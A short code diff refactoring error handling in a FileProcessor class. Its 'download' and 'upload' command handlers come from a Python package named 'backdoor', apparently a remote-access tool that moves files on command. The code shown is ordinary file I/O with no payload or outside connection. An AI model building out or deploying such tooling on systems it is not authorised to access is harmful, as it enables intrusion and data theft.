@@ -1,4 +1,5 @@
 from pathlib import Path
+from backdoor.exceptions.core import InvalidArgumentException
 from backdoor.files.io import FileReader, FileWriter
 from backdoor.models.commands import Command, CommandResult
 
@@ -11,12 +12,9 @@ class FileProcessor:
 
     def download(self, command: Command) -> CommandResult:
         if not command.args:
-            raise ValueError("err: file path not provided")
+            raise InvalidArgumentException("file path not provided")
         path = command.args[0]
-        try:
-            content = self.file_reader.read(path)
-        except ValueError as e:
-            raise ValueError(f"err: {e}")
+        content = self.file_reader.read(path)
         return CommandResult(
             success=True,
             returncode=0,
@@ -25,9 +23,9 @@ class FileProcessor:
 
     def upload(self, command: Command) -> CommandResult:
         if not command.args:
-            raise ValueError("err: file name not provided")
+            raise InvalidArgumentException("file name not provided")
         if not command.payload:
-            raise ValueError("err: file content not provided")
+            raise InvalidArgumentException("file content not provided")
         file_name = command.args[0]
         file_path = str(Path(file_name).absolute())
         self.file_writer.write(command.payload, file_path)
